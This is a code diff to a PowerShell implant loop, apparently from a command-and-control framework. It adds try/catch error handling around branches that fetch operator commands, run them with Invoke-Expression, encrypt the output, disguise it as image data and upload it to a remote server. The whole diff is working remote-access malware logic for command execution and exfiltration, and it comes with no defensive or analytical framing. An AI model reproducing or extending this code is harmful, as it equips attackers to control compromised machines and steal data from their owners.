@@ -1537,7 +1537,7 @@ while($true)
         $error.clear()
         if ($ReadCommandClear -ne "fvdsghfdsyyh") {
             if  ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
-
+                try {
                 $Output = Invoke-Expression $ReadCommandClear | out-string
                 $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                 if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
@@ -1545,9 +1545,12 @@ while($true)
                 $Output = Encrypt-String2 $key $Output
                 $UploadBytes = getimgdata $Output
                 (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
+                } catch {
+                    $Output = "Error: " + $error[0]
+                }
 
             } elseif  ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
-
+                try {
                 $modulename = $ReadCommandClear -replace "LoadModule",""
                 $Output = Invoke-Expression $modulename | out-string  
                 $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
@@ -1555,6 +1558,9 @@ while($true)
                 $Output = Encrypt-String2 $key $Output
                 $UploadBytes = getimgdata $Output
                 (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
+                } catch {
+                    $Output = "Error: " + $error[0]
+                }
 
             } else {
                 try {
@@ -1772,7 +1778,7 @@ while($true)
         $error.clear()
         if ($ReadCommandClear -ne "fvdsghfdsyyh") {
             if  ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
-
+                try {
                 $Output = Invoke-Expression $ReadCommandClear | out-string
                 $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                 if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
@@ -1780,16 +1786,22 @@ while($true)
                 $Output = Encrypt-String2 $key $Output
                 $UploadBytes = getimgdata $Output
                 (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
+                } catch {
+                    $Output = "Error: " + $error[0]
+                }
 
             } elseif  ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
-
-                $modulename = $ReadCommandClear -replace "LoadModule",""
-                $Output = Invoke-Expression $modulename | out-string  
-                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
-                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
-                $Output = Encrypt-String2 $key $Output
-                $UploadBytes = getimgdata $Output
-                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
+                try {
+                    $modulename = $ReadCommandClear -replace "LoadModule",""
+                    $Output = Invoke-Expression $modulename | out-string  
+                    $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                    $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
+                    $Output = Encrypt-String2 $key $Output
+                    $UploadBytes = getimgdata $Output
+                    (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
+                } catch {
+                    $Output = "Error: " + $error[0]
+                }
 
             } else {
                 try {
